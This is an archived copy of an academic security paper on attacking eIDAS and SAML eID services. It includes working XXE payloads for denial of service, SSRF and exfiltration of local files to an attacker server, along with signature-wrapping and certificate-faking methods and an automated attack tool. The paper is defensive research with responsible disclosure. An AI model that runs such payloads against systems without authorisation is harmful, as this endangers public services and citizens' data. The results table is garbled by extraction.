---
type: Article
title: Security Analysis of eIDAS — The Cross-Country Authentication Scheme in Europe
description: "A security analysis of eIDAS, the cross-border electronic identity scheme European member states must recognise. Testing national eIDAS-Connector and eIDAS-Service implementations found XML attacks reaching them through SAML: 7 of 15 services were open to denial of service or server-side request forgery, and 5 let local files be read and sent to the attacker via XML external entities."
resource: "https://www.usenix.org/conference/woot18/workshop-program"
tags: [article, webseclist-reference, en, usenix, xxe, ssrf, dos, saml, sso, info-leak, owasp-a03-2021, owasp-a07-2021, owasp-a10-2021]
generated:
  by: webseclist-refs/1
  at: "2026-08-17T10:10:34+00:00"
status: stable
stale_after: 2027-08-17
sources:
  - id: original
    resource: "https://www.usenix.org/conference/woot18/workshop-program"
    title: Security Analysis of eIDAS — The Cross-Country Authentication Scheme in Europe
    last_modified: 2018-07-02
also_at:
  - "https://www.usenix.org/system/files/conference/woot18/woot18-paper-engelbertz.pdf"
authors: []
canonical_url: ""
cited_by:
  - "2018.md:89"
commit: ""
content_sha256: 8bf0125f11cf8aae12a424e1ea45892e6db406096823e9fdbe96ed24d21f7e58
depth: full
depth_reason: default
kind: article
language: en
licence: unknown
original_url: "https://www.usenix.org/conference/woot18/workshop-program"
published: 2018-07-02
publisher: USENIX
publisher_english: ""
raw_sha256: d97e63bc33308ada81b3eabcaddac810fde05b1946e1cadbdcd93ca8c989faf7
retrieved_from: "https://www.usenix.org/system/files/conference/woot18/woot18-paper-engelbertz.pdf"
retrieved_kind: live
retrieved_utc: "2026-08-17T10:10:34+00:00"
slug: 2018-usenix-woot-18-workshop-program
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Security Analysis of eIDAS — The Cross-Country Authentication Scheme in Europe

**Security Analysis of eIDAS — The Cross-Country Authentication Scheme in Europe** - Author not stated, USENIX.

- Published: 2018-07-02
- Original: <https://www.usenix.org/conference/woot18/workshop-program>
- Also published at: <https://www.usenix.org/system/files/conference/woot18/woot18-paper-engelbertz.pdf>
- Preserved from: https://www.usenix.org/system/files/conference/woot18/woot18-paper-engelbertz.pdf (live) on 2026-08-17
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

Security Analysis of eIDAS – The Cross-Country
                             Authentication Scheme in Europe

                           Nils Engelbertz, Nurullah Erinola, David Herring,
                         Juraj Somorovsky, Vladislav Mladenov, Jörg Schwenk
                                 Chair for Network and Data Security,
                      Horst Görtz Institute for IT-Security, Ruhr University Bochum


Abstract
In 2014, the European Commission released the eIDAS
regulation to target the compatibility of cross-country
electronic services within the European Union. eIDAS
(electronic IDentification, Authentication, and Trust Ser-
vices) defines implementation standards and technolo-
gies for electronic signatures, digital certificates, Single
Sign-On (SSO), and trust services. It is based on well-
established standards, such as SAML, to achieve high
security and compatibility between EU countries.
   In this paper, we present the first security study of au-   Figure 1: Overview of the eIDAS authentication scheme
thentication schemes used in eID services. Our secu-           depicting the End-User, Service Provider (SP), Identity
rity analysis shows that 7 of the 15 European eID ser-         Provider (IdP), and both eIDAS Nodes.
vices were vulnerable to XML-based attacks which en-
abled efficient Denial-of-Service (DoS) and Server Side
Request Forgery (SSRF) attacks. On 5 of the 15 eID             to meet national requirements and regulations, countries
services, we were even able to exfiltrate locally stored       chose differing technologies and implemented specific
files and send these files to an arbitrary domain. To sup-     extensions and functionalities. This caused incompatibil-
port the developers and security teams of eID services,        ities between eID services and European cross-country
we implemented a Burp Suite extension to execute fully-        authentication became impossible.
automated or semi-automated tests. Additionally, we            eIDAS. In 2014, the European Commission addressed
summarize best practices related to eID-based authenti-        these cross-country incompatibilities for eID authenti-
cation and SSO in general.                                     cation by releasing the eIDAS regulation and defining
                                                               different communication profiles used for authentication
1   Introduction                                               and trust establishment. Throughout this paper, we re-
In the last few years, European countries have worked          fer to this authentication scheme as eIDAS authentication
on developing strong authentication schemes based on           scheme. The scheme uses SAML [12] as an authentica-
electronic identification (eID) cards. The main goal           tion protocol.
of these authentication schemes is to provide access to           Figure 1 gives a high level overview of cross-country
different services, called eID services. For these ser-        eIDAS authentication. In our example, a German End-
vices, access should be provided for citizens and orga-        User wishes to use services provided by a French ser-
nizations by using information already available on eID        vice provider (SP). The End-User cannot simply use the
cards, for example, on the personal ID card which was          German IdP directly to authenticate at the French SP
issued by a government institution. Many countries de-         since the SP could not process the authentication token
veloped their own authentication schemes based on well-        issued by the IdP. Therefore, eIDAS Nodes are used to
established technologies that provide functionalities for      translate the tokens and make them compatible between
secure browsing, login mechanisms, SSO, or exchang-            eID schemes. The SP first forwards the request to the
ing confidential data over untrusted networks. In order        French eIDAS Node, which translates the request for
the German eIDAS Node. The German eIDAS Node                  2.1       Single Sign-On (SSO)
then forwards the compatible request to the authoritative
IdP, which can issue authentication tokens for the End-       Single Sign-On (SSO) is a concept to log a user into a
User. The authentication token is finally translated for      Service Provider (SP) without storing any credentials on
the French SP using eIDAS Nodes.                              that SP. For this purpose, SSO uses a trusted third party
                                                              called Identity Provider (IdP). An abstract overview of
Security of eIDAS. In recent years, it has been shown         SSO is depicted in Figure 2.
how to break SAML-based SSO systems and login as
an arbitrary user [62, 64, 37], read arbitrary files from                                       delegates authentication,
                                                                                                requests tokens & claims
SAML servers [37], or how to break XML Encryption             Service Provider                                                        Identity Provider
                                                                    https://sp.com               issues tokens & claims                      https://idp.com
and decrypt the exchanged SAML assertions [29, 26, 27,
62]. Because eIDAS makes use of these technologies,
such attacks present a serious threat to the eID users and                           accesses
                                                                                     services
                                                                                                                            authenticates,
                                                                                                                             grants access
their prevention is, therefore, of high importance.
Automated Security Analysis. In order to support
                                                                                                End-User UA
eID developers in their development process, we ex-
tended the tool EsPReSSO (Extension for Processing and        Figure 2: An abstract overview of the entities in SSO and
Recognition of Single Sign-On Protocols), which facili-       their relation to each other.
tates in analyzing different SSO protocols and their used
information flow. We implemented a prototype of the at-
                                                                 The IdP manages user identities and provides at least
tacks described in Section 3 into EsPReSSO so that eID
                                                              one authentication mechanism, e.g., username/password.
developers are able to search for known vulnerabilities.
                                                              The IdP issues authentication tokens containing informa-
Discovered Vulnerabilities. The relevance of these vul-       tion about the authenticated End-User. The End-User is
nerabilities is proven in our evaluation, as we revealed      a human being navigating a user agent (UA), e.g., a web
security flaws in 7 of 15 eID services which enabled at-      browser. The SP is a publicly available service offer-
tacks such as DoS, SSRF, and on 5 of 15 systems, even         ing access to resources for registered End-Users. If the
unauthorized file exfiltration. We reported the discov-       End-User visits the SP and requests access to restricted
ered vulnerabilities to the affected providers and national   resources, authentication is required. The SP delegates
CERTs. We also cooperated with the system develop-            authentication of End-Users by issuing an Authentica-
ers on implementing the countermeasures and provided          tion Request to an IdP. Afterwards, the SP verifies the
a second test to verify the implemented fixes.                authentication tokens generated by an IdP to authenticate
Contributions. The contributions of this paper can be         the End-User.
summarized as follows:                                        SAML. SAML is an XML [9] standard for exchanging
I We present the first security evaluation of existing eID    authentication and authorization statements about sub-
  services and reveal security gaps in 7 of the 15 eID        jects [12],and uses XML-based assertions to transmit
  services.                                                   these statements. A SAML assertion contains several
                                                              essential components: The Issuer element specifies the
I We provide a comprehensive overview of the attacks          SAML authority that is making the claim(s) in the asser-
  relevant to eID scenarios. These attacks target the         tion – the IdP. The assertion’s Subject defines the prin-
  underlying TLS protocol [14], XML parser (XXE at-           cipal about whom all statements within the assertion are
  tacks) [70], and cryptographic standards like XML           made. Further elements are included to specify message
  Signature [25] and XML Encryption [15].                     validity or user-defined statements relevant for the mes-
I We provide a tool to facilitate the security analysis of    sage context.
  eID services, supporting developers and security ex-           To protect the integrity of the security claims made by
  perts to discover security flaws.                           the Issuer, the whole Assertion element must be pro-
                                                              tected with a digital signature following the XML Signa-
I We summarize the lessons learned in security guide-         ture specification [16]. Usage of the SAML assertions in
  lines and a Best Current Practices section for the de-      various XML messages is described in the SAML Bind-
  ployment of secure eID infrastructures.                     ings specification [60].

2    Foundations                                              2.2       eIDAS Services
This section summarizes relevant foundations regarding        Many EU countries defined and implemented their own
SSO, SAML, and the utilization of SAML in eIDAS.              singular eID scheme. Differences between the schemes
prevent member states from seamlessly exchanging elec-            several gigabytes in size [69, 66]. An example is given
tronic identification data and trust services.                    in Listing 1. First, an entity ent0 is declared, referencing
   In order to achieve compatibility in cross-boarder eID         the string DoS. Next, an entity ent1 references a con-
communication, eIDAS was defined [54]. eIDAS does                 catenation of several times ent0. This back-referencing
not provide a standalone SSO solution, but rather speci-          to multiple instances of entities, which is defined in the
fies a SAML 2.0 based compatibility layer between dif-            preceding step, is repeated and results in an exponential
ferent eID implementations [19, 12]. The components               expansion of the document size.
facilitating this cross-border information exchange are       1   <!DOCTYPE data [
called eIDAS-Nodes [19]. As depicted in Figure 1, eI-         2     <!ENTITY ent0 "DoS">
                                                              3     <!ENTITY ent1 "&ent0;&ent0;&ent0;&ent0;">
DAS Nodes “translate” incoming SAML requests from             4     <!ENTITY ent2 "&ent1;&ent1;&ent1;&ent1;">
the SP into authentication requests compliant with the        5     ...
                                                              6     <!ENTITY ent13 "&ent12;&ent12;&ent12;&ent12;">
eID scheme of the end user’s country of origin. On the        7   ]>
other side of this process, the eIDAS-Nodes also convert      8   <data>&ent13;</data>
the authentication tokens generated by one country into
tokens which can be processed by the SP.                          Listing 1: The Billion Laughs Attack abuses limited
                                                                  recursion of General Entities to exponentially expand the
                                                                  document size.
3     XML Attacks on eIDAS Services
                                                                  DoS Using External Entities. If the XML parser re-
eIDAS is based on SAML, which is, in turn, based on               solves External Entities, a plethora of DoS attack-vectors
eXtended Markup Language (XML). Consequentially,                  may be available. For example, an adversary might be
eIDAS services may be susceptible to XML-based at-                able to induce network requests for large remote files,
tacks. In this section, we focus on Document Type Def-            thereby exhausting network or memory capacity of the
inition (DTD) attacks. After sketching out our attacker           system under attack. By inducing a large number of
model, we provide an overview of common goals for                 outgoing requests, resources of both the targeted XML
DTD attacks and appropriate attack vectors.                       parser and the destination of the forged requests may
                                                                  quickly become exhausted [70]. An overview regarding
                                                                  how such requests can be forged is given in the next sec-
3.1    Attacker Model and Prerequisites                           tions.
We consider a Web-Attacker that is capable of generating          Other Techniques. Several variants of the above attacks
XML messages, crafting and sending requests, and se-              exist. The Quadratic Blowup attack declares a single
lecting the appropriate encoding for each part of the sub-        XML Entity that expands into a large string of several
mitted request. Furthermore, the attacker controls a pub-         megabytes, greatly exceeding the size of the document.
licly available server (henceforth attacker-listener) and         The Recursive Entity attack exploits XML parsers by re-
can observe requests made to this server with arbitrary           cursively resolving nested entities [66].
protocols. As we focus on DTD and XML External En-
tity attacks, no third party is involved. The goals of the        3.3    SSRF
attacker can roughly be categorized into DoS, SSRF, and
File Exfiltration, and are further described in the follow-       One considerable area of attack exposed by many XML
ing sections.                                                     parsers is their capability to deal with various URL han-
                                                                  dlers. The following paragraphs explore some meth-
                                                                  ods on how this can be abused for Server Side Request
3.2    Denial-of-Service (DoS)                                    Forgery (SSRF).
DoS attacks aim at decreasing the availability of the ser-        SSRF Using External DTD. A simple way to force a
vice under attack. This is primarily achieved by mak-             vulnerable XML parser to perform an outgoing request is
ing the target consume large amounts of computational             to reference an external DTD. The example in Listing 2
resources such as memory, bandwidth, or processing                shows how the XML parser can be induced to query a
power while only investing a fraction of the resources            service in its local network, which would otherwise be
by the attacker [69].                                             unreachable for an external adversary.
Billion Laughs Attack. A well-known DTD-based DoS             1   <!DOCTYPE data SYSTEM "http://192.168.178.2/shutdown">
                                                              2   <data>arbitrary content</data>
attack is the so-called Billion Laughs Attack [32, 66].
This attack employs recursively defined Internal General
                                                                  Listing 2: Using external DTDs to induce server side
Entities, forcing the XML parser to expand a relatively
                                                                  requests [66].
small input document into a document which can reach
    An alternative for the SYSTEM keyword is PUBLIC "id" as              If the content of a referenced file is not well-formed ac-
    shown Listing 3.                                                     cording to the XML specification, well-behaved parsers
1   <!DOCTYPE data PUBLIC "id" "http://192.168.178.2/shutdown">
                                                                         will abort entity expansion with an exception. Several
2   <data>arbitrary content</data>                                       techniques are known to circumvent this restriction using
                                                                         Parameter Entities to wrap file contents in a <![CDATA
    Listing 3: The PUBLIC keyword references an external                 []]> block [70, 66].
    DTD associated with an identifier id.                                File Exfiltration Using SSRF. Even if no direct feed-
                                                                         back channel is available, file contents can sometimes
    SSRF Using External (Parameter) Entities. In addi-                   still be extracted. If the parser can establish network
    tion to external DTDs, External Entities can be used to              connections, an adversary can proceed as follows: an ex-
    cause server side requests, as shown in Listing 4. Be-               ternal DTD can be used to declare Parameter Entities,
    cause some parsers are able to restrict the allowed proto-           which can then be included in URLs of forged parser re-
    col handlers, it may be beneficial to try a number of dif-           quests. An example is given below [66].
    ferent protocols besides http. Examples include, but are
                                                                     1   <!DOCTYPE data [
    not limited to, ftp://, smb://, http://, https://,               2     <!ENTITY % ext SYSTEM "http://attacker.org/ext.dtd">
    file://, and the short UNC path form //.                         3     %ext;
                                                                     4   ]>
1   <!DOCTYPE data [                                                 5   <data>&send;</data>
2     <!ENTITY extEnt SYSTEM "http://192.168.178.2/shutdown">
3   ]>
4   <data>&extEnt;</data>                                                Listing 6: An external document defines an additional
                                                                         XML Entity send which is used for request forgery (see
    Listing 4: Causing Server Side Requests using External               Listing 7)
    Entities
                                                                            If the Parameter Entity reads a local file, as illustrated
    Another way to force the parser to perform outgoing re-              in Listing 7, its content may then be sent to the attacker
    quests is to use Parameter Entities [66].                            as a part of the URL’s path or query-string.
    Other Techniques. The XML specification provides                 1   <!ENTITY % file SYSTEM "file:///etc/hostname">
                                                                     2   <!ENTITY % tmp "<!ENTITY send SYSTEM
    additional methods that can be abused to forge Server            3                       ’http://attacker.org?f=%file;’>" >
    Side Requests from the XML parser. Most prominently,             4   %tmp;
    schemaLocation and noNamespaceSchemaLocation can
    cause insecurely configured parsers to issue network re-             Listing 7: The file hosted at attacker.org/ext.dtd
    quests [66]. The xInclude extension [38] provides the                concatenates the file content with a request URL using
    opportunity for an additional attack.                                Parameter Entities.

                                                                         The example above is a slight variation of a similar tech-
    3.4    File Exfiltration                                             nique presented by Morgan and Ibrahim in 2014 [70].
    Exfiltration of file content from the parser’s local file sys-
    tem can be feasible if a direct feedback channel at the ap-          4    Automated Analysis
    plication level exists. Exfiltration is also possible if file
    content can be included in forged requests to a destina-             The security evaluation of eID services shares many sim-
    tion under the adversary’s control.                                  ilarities with the analysis of SSO services, since both
                                                                         technologies are based on the same authentication pro-
    File Exfiltration Using Direct Feedback. In contrast to
                                                                         tocols. This allows for already existing penetration test-
    the External Entity’s intended purpose of including ad-
                                                                         ing tools to be used in the security evaluation. We de-
    ditional DTDs from external sources, an adversary can
                                                                         cided to utilize Burp Suite (Burp),1 which is a widely
    abuse the functionality of External Entities to include
                                                                         used penetration testing tool for web applications. Burp
    files that are otherwise inaccessible. In Listing 5, we as-
                                                                         acts as an intercepting proxy and can be used to log, in-
    sume a direct feedback channel, e.g., the application re-
                                                                         tercept, display, and modify HTTP traffic. To facilitate
    turns the contents of the <data> element in its response.
                                                                         more complex scenarios, Burp offers extension points
1   <!DOCTYPE data [                                                     which allow developers to extend its existing functional-
2     <!ENTITY extEnt SYSTEM "file:///etc/passwd">
3   ]>                                                                   ity. One relevant extension we utilized was the Extension
4   <data>&extEnt;</data>                                                for Processing and Recognition of Single Sign-On Pro-
                                                                         tocols (EsPReSSO).2 This extension is open-source and
    Listing 5: Using a Direct Feedback channel of the <data>
                                                                             1 https://portswigger.net/
    element to read out /etc/passwd                                          2 https://github.com/RUB-NDS/BurpSSOExtension
is able to automatically identify and classify SSO mes-       tificate Viewer greatly eases a quick quality inspection of
sages, allowing penetration testers to easily analyze and     the included certificates.
manipulate SSO flows.                                         DTD-Attacker. To facilitate penetration tests, we imple-
   In this section, we first describe the basic functional-   mented a new feature in EsPReSSO – the DTD-Attacker.
ities of EsPReSSO which were available at the start of        Based on the attacks summarized in Section 3, we cre-
our project. Subsequently, the extensions we added to         ated a set of 18 attack vectors and implemented these
the tool to improve its usability for eID analyses are pre-   into the DTD-Attacker. During testing, the penetration
sented.                                                       tester can tweak the selected attack vector within the
                                                              DTD-Attacker. All modifications are automatically ap-
4.1    EsPReSSO – Basic Functionalities                       plied to the original message. An abstract overview of
                                                              the DTD-Attackers UI is presented in Appendix C.
EsPReSSO was designed and implemented to recognize               The DTD-Attacker allows for easy, vector-
and distinguish SSO protocols. It has an automatic scan-      independent pre-configurations that are automatically
ning function that passively inspects the browser’s traf-     applied to the selected vectors. For example, the
fic by scanning HTTP parameters and keywords. In              complexity of the DoS attack vectors can be optimized
the event that an SSO protocol is recognized, the re-         by specifying a number of recursive entities and entity
quest/response is highlighted and a note referencing to       references. This allows testers to precisely measure the
the protocol is shown. Furthermore, specifically for the      impact of the DoS attack.
SAML protocol, EsPReSSO provides a SAML-Editor                   Furthermore, for those attack vectors which cause
and SAML-Attacker.                                            URL invocation, the DTD-Attacker allows for the con-
SAML-Editor. The SAML-Editor searches each inter-             figuration of arbitrary URLs, which may be needed in
cepted HTTP request/response for SAML relevant pa-            order to evaluate the success of the attack. It is also pos-
rameters and automatically decodes the SAML mes-              sible to apply a specific encoding to the vector. This may
sage before displaying the SAML AuthnReq or Authn-            allow penetration testers to bypass simple filter mech-
Response, respectively. Furthermore, the SAML-Editor          anisms that only work when encountering the standard
provides the means to carry out modifications of the in-      XML character set, i.e., UTF-8.
tercepted messages in a user-friendly way.                       For a comprehensive vulnerability analysis, a large
SAML-Attacker. EsPReSSO also provided a user in-              number of attack vectors must be tested. For this rea-
terface with a small predefined set of attacks; for exam-     son, the DTD-Attacker can be used in a fully automated
ple, specific attacks targeting XML Signature processing.     mode. Before starting the evaluation, the penetration
However, not all known attack vectors were covered by         tester only needs to configure a single parameter: the
EsPReSSO.                                                     attacker-listener URL where the HTTP requests are sent.
                                                              The provided URL is then automatically inserted into all
                                                              attack vectors and sent to the target. If the target is vul-
4.2    Extending EsPReSSO                                     nerable, the attacker-listener will receive a correspond-
The shortcomings of the previous EsPReSSO version             ing request from the target. This automated approach al-
and the missing attacks were the motivating factors for       lows penetration testers to quickly determine vulnerable
the improvement of this extension.                            targets and what specific attack vectors the target may be
                                                              vulnerable to.
SAML-Editor. SAML messages are transmitted in an
encoded form. To alter an intercepted SAML message,           SAML-Attacker. We also extended the EsPReSSO
a penetration tester needed to first decode the message,      functionality for targeted SAML attacks. EsPReSSO
then manipulate it, and finally re-encode it before relay-    supported the execution of basic Certificate Faking
ing the modified message. During security evaluations,        (CF) [37] and XML Signature Wrapping (XSW) at-
this process can be time consuming and bothersome. We         tacks [64]; however, the implementations of these attacks
therefore addressed this issue by extending the SAML-         contained several bugs. We resolved these bugs and ad-
Editor in EsPReSSO to achieve more fine-grained con-          ditionally implemented a new user interface for the Sig-
trol over each aspect of the intercepted message. As an       nature Exclusion (0Sig)
                                                                                   /     attack [37].
example, it is now possible to easily change the HTTP            During execution of the 0Sig
                                                                                            /    or CF attack, the auditor
method (HTTP-GET or HTTP-POST) with the message               can now select the specific signature element on which
being automatically re-encoded.                               the attack will be applied. During the CF attack, the
   We additionally implemented a Certificate Viewer to        original certificate is copied, the key is replaced, and the
make certificate properties and key material provided         certificate is re-signed. Next, the original certificate is
within the SAML messages easily accessible. The Cer-          replaced and the target message is also re-signed.
                                                                                                         /
                                                        s




                                                                                             XIn ocation
                                                   titie




                                                                                                                     D
                                                              Ent eter)




                                                                            Ent eter)




                                                                                                                 l DT
                                                             (Par ternal




                                                                           (Par ternal
                                                      n




                                                                                                    e
                                                                                                clud
                                                  ve E




                                                                 ities




                                                                               ities
                                                                 am




                                                                               am




                                                                                                 L




                                                                                                                 erna
                                                               Ex




                                                                             Ex




                                                                                             ema
                                              ursi




                                                                                                             Ex t
                                                                                          Sch
                                            Rec
        eIDAS Provider                                      DoS                          SSRF                            File Exfiltration
        eIDAS Pilot Sweden                        –               71           7                 3               7              7
        eIDAS Pilot Belgium                       –               3            3                 3               3              3
        eIDAS Pilot Czech Republic                –               3            3                 3               3              3
        Provider 1                                –               71           7                 3               7              7
        eIDAS Pilot Estonia                       –               3            3                 3               3              3
        eIDAS Pilot France                        –               3            3                 3               3              3
        eIDAS Pilot Norway                        –               3            3                 3               3              3
        ArubaPEC S.p.A                            –               3            3                 3               3              3
        Provider 2                                –               71           72                3               72             3
        InfoCert S.p.A.                           –               71           7                 3               7              7
        Provider 3                                –               71           7                 3               7              7
        Provider 4                                –               71           72                3               72             3
        Register.it S.p.A                         –               71           7                 3               7              7
        Sielte S.p.A                              –               3            3                 3               3              3
        TI Trust Technologies srl (TIM)           –               3            3                 3               3              3
        Vulnerable in Total                       –               7            7                  0              7              5
        1 To avoid harm, we did not test the full impact of the attacks.
        2 Only DNS requests were observed.


                                              3= Not vulnerable, 7= Vulnerable, – = Not evaluated

      Table 1: XML parsing vulnerabilities are still an effective attack technique to which 7 of the 15 tested
      SAML endpoints were found to be vulnerable.


5   Evaluation of XML Attacks                                              cluded from the fact that DoS attacks based on Exter-
                                                                           nal (Parameter) Entities are always possible if the XML
In our evaluation, we concentrated on the security anal-                   parser can be tricked into loading external files. We did
ysis of general XML-based parsing attacks and their ap-                    not evaluate whether DoS attacks with nested or recur-
plication to eIDAS services. This is because XML-based                     sive entities were applicable. When testing SAML end-
attacks do not necessarily demand the usage of valid ac-                   points, there is usually no direct server feedback and
counts since only XML parsers are targeted. For their                      one cannot observe whether nested entities are resolved.
evaluation, only correct endpoint URLs of the analyzed                     Therefore, all test vectors with a real DoS potential were
service are necessary in order to gain access to the SAML                  omitted to avoid damaging the tested service endpoints.
parsing functionality. No valid eID cards, accounts, or                    SSRF Attacks. Of the tested servers, seven were vulner-
configurations are necessary. This allowed us to test a                    able to SSRF attacks. These could be executed using
large number of eIDAS services.                                            External (Parameter) Entities and by loading external
   Table 1 shows the results of our evaluation for the 15                  DTDs. None of the servers resolved SchemaLocation or
tested eIDAS services. It confirms that XML parsing at-                    XInclude elements.
tacks are still a prevalent attack technique. We cooper-
ated with the affected providers who were able to suc-                     File Access. Of the fifteen eIDAS Nodes, five were vul-
cessfully apply countermeasures to these attacks. Sev-                     nerable to attacks where the parsers were forced to read
eral providers which have not yet rolled out fixes or have                 external or local files. Although two additional servers
not responded to our emails have been anonymized in                        were vulnerable to SSRF attacks, we were only able to
Table 1. In case of unresponsive providers, we contacted                   force these servers to issue DNS queries. Reading re-
the responsible CERT team regarding the security issues                    mote external files was not possible.
and are currently awaiting further information regarding                   Lessons Learned. Although DTD vulnerabilities have
the status of the fixes.                                                   been known since 2005 and multiple security studies ex-
DoS Attacks. We were able to confirm the existence of                      ist, it is surprising that such a large number of vulnera-
DoS vulnerabilities in seven services. This can be con-                    bilities were found.
   The user agent identifiers included in forged server-      I To avoid harm on the evaluated systems, we only veri-
side requests indicate that all implementations vul-            fied the possibility to carry out DoS attacks and we did
nerable against SSRF and DoS are programmed in                  not actually carry out these attacks.
Java. As found in a comprehensive evaluation of XML
parsers [66] provided in 2016, all Java XML parsers           I During the course of the project, some of the systems
are vulnerable against XML External Entity Attacks              were updated with newer versions of the applications.
(XXEAs) in their default configuration. Consequently,           Therefore, some previously discovered security issues
services remain vulnerable if the responsible developers        were fixed before reporting these to the developers.
and administrators do not explicitly disable these inse-
cure features.                                                Selected Test Target. We were not able to perform com-
   We employed the blackbox approach for testing and          prehensive penetration tests for all the eIDAS providers
do not know whether the vulnerable services share the         listed in Table 1. The reason is that we did not pos-
same XML stack. Nevertheless, we believe that Java’s          sess valid identity cards or other credentials for these
insecure defaults are the underlying reason for the abun-     providers which are necessary to gain authentication
dance of similar vulnerability patterns.                      tokens for further SAML evaluations. Therefore, for
                                                              our penetration test, we chose the eIDAS Pilot of the
                                                              Swedish E-identification Board.3 It provides a demo SP
6     Comprehensive Evaluation of the eIDAS                   as well as a fictional sending member state Test Coun-
      Swedish Pilot                                           try XX to simulate eIDAS authentication at a compliant
                                                              IdP without requiring a valid eID card. This test environ-
This section summarizes the security test suite that can      ment, available from http://eidasweb.se, allowed us
guide both developers and security auditors alike during      to simulate an end-to-end eIDAS authentication involv-
their work with SAML based SSO environments. A con-           ing six SAML endpoints (see Appendix B), inspect all
densed overview is given below and in Table 3.                the messages exchanged through the user agent between
                                                              participating services, and above all, to employ our test-
6.1    Testing Methodology                                    suite in the field.
We define a number of tests relevant for the eID ser-
vices, summarize known attacks, and categorize these          6.2     eIDAS Test-Suite
into three different classes. Since many of the targeted
                                                              Our tests can be roughly divided into three categories:
eID services are potentially closed-source web applica-
                                                              (1) Transport Layer Security, (2) Web Application Secu-
tions, the chosen testing methodology is a black-box ap-
                                                              rity, and (3) Message-Level Security. We provide a digest
proach. This allows us to define a generic test suite irre-
                                                              of the main components that compose the test suite in the
spective of a programming language, framework, or sim-
                                                              following sections.
ilar restrictions that might otherwise be imposed by the
test-target.
Limitations. During this survey we encountered the fol-       6.2.1   Transport Layer Security
lowing problems:                                              TLS [14] is a complex protocol used to protect message
I National eID schemes generally require a valid eID          integrity and confidentiality on the underlying transport
  card to complete the entire authentication process.         protocol, and plays an important role in secure com-
  Due to the fact that no test eID card was available, we     munications. Several critical vulnerabilities have been
  limited our targets to demo services which allowed au-      found in Transport Layer Security (TLS) libraries in
  thentication without an eID card. For this reason, the      the past, ranging from implementation faults to crypto-
  actual eID based End-User authentication is not part        graphic weaknesses (cf. [61, 42, 3, 7, 8]). These prob-
  of our evaluation. Please note that communication be-       lems can largely be mitigated by simply deploying the
  tween eIDAS compliant parties is not affected by this       latest version of the used TLS libraries where the secu-
  limitation.                                                 rity updates have been applied. However, care must still
                                                              be taken to securely configure the library’s properties.
I We focused on SAML because it constructs the com-              We evaluated the security of the TLS endpoints using
  patibility layer of eIDAS. National eID schemes may         TLS-Attacker,4 which is currently the most advanced
  of course be based on different technologies which are      and freely available tool to discover security issues in
  not considered in this work.                                TLS. We tested the deployed TLS protocol versions
I There is no public list of existing eID services. Find-        3 https://www.elegnamnden.se

  ing such services can, therefore, be a challenging task.       4 https://github.com/RUB-NDS/TLS-Attacker
and cipher suites, properties of the used certificates,       XSLT Attack (XSLTA). XML Signatures rely on certain
and specific TLS attacks. In particular, this included:       preprocessing routines called transformations. These
DROWN [3], POODLE [43], Heartbleed [57], Bleichen-            are used to derive a canonical form of the XML docu-
bacher’s attack [6, 7], the invalid curve attack [28], and    ment before computing or verifying the associated signa-
the padding oracle attack [71]. No host of the Swedish        ture. Because the transformations are applied before the
eIDAS test infrastructure was found to be vulnerable to       document’s signature can be verified, an adversary can
any of these attacks, nor did we detect insecure configu-     alter the signature’s <transformation> elements. The
rations.                                                      XSLT Attack (XSLTA) makes use of this fact and, in
                                                              the worst case, can lead to arbitrary code execution.
                                                              The XML processor should, therefore, disable support
6.2.2   Message Level Security
                                                              for the Extensible Stylesheet Language Transformation
SSO protocols usually involve multi-party communica-          (XSLT) and terminate validation upon receiving invalid
tion. Therefore, it is not sufficient to simply secure the    <transformation> elements.
underlying transport; the message itself must be pro-            We examined all services of the Swedish eIDAS pilot
tected against tampering and, if necessary, provide ap-       for XSLTAs and none was found to be vulnerable.
propriate guarantees for confidentiality of its contents.     XML Encryption Attack (XEA). Several vulnerabil-
SAML makes use of XML Signatures [25] and XML En-             ities in XML Encryption implementations have been
cryption [17] to fulfill these requirements.                  found in the past, such as attacks against CBC mode in
Signature Exclusion (0Sig).
                         /      Each recipient of a mes-      symmetric ciphers and attacks against asymmetric RSA-
sage must only accept a message if a valid signature is       PKCS1.5 encryption [29]. Backwards compatibility at-
provided. If the application accepts messages which do        tacks against secure algorithms must also be taken into
not include a signature, the message could be altered and     consideration. Successful attacks against XML Encryp-
the authentication is broken.                                 tion would undermine the confidentiality goals of eI-
   None of the six SAML services participating in the         DAS’ encrypted SAML assertions [18].
Swedish eIDAS pilot accepted a SAML message without              We could not successfully execute or even test the un-
a signature.                                                  derlying XML Encryption implementation used by the
Certificate Faking (CF). The process of replacing the         Swedish eIDAS pilot. This is because we were unable
<Signature> element of an XML message with a self-            to find a signature bypass against any of the participating
generated signature and key is termed Certificate Fak-        SAML services and, therefore, could not alter the cipher-
ing [37]. Each recipient of a message, where the in-          text of encrypted assertions. One endpoint was found to
tegrity is protected by an XML signature, must ensure         encrypt SAML Assertions using unauthenticated CBC
to exclusively use trusted keys for signature verification.   mode, potentially enabling attacks on encrypted XML
In particular, keys included in the message must not be       ciphertexts [29]. However, the enveloped XML signa-
considered as trustworthy without further verification. If    ture applied to the document’s root element mitigated
a single SAML service is vulnerable to Signature Faking,      any XML Encryption Attacks.
the authentication scheme is broken because a malicious       Replay Attack. In an SSO context, replay attacks tar-
user is able to forge arbitrary messages and identities.      get the multiple redemption of an authentication token,
   The Swedish eIDAS test environment was found to be         regardless of any existing freshness and lifetime restric-
resistant against Signature Faking; no involved entity ac-    tions. SSO tokens contain at least one parameter guaran-
cepted self-generated or faked signatures.                    teeing freshness and one defining the expiration time. It
XML Signature Wrapping (XSW). The XSW attack                  is up to the SP to implement this verification correctly.
against the XML Signature specification was first pub-        A special case of Replay Attacks exists in SAML, where
lished in 2005 [40]. The main idea behind this attack is      the AuthnReq can contain parameters restricting the life-
to change the structure of the XML element tree in such a     time and guaranteeing freshness. The IdP should verify
way that the application’s business logic processes a dif-    all relevant parameters.
ferent element than the signature verification logic. This       Five out of the six tested SAML endpoints accepted
allows an adversary to submit arbitrary content to the        each token exactly once. Freshness of the token is en-
vulnerable service. Several high-profile sites and SAML       sured by the IssueInstant attribute and the unique token
libraries have been found to be vulnerable to XSW in the      ID. The demo SP allowed multiple successful redemp-
past [64].                                                    tions of the same AuthnResponse, as long as the token is
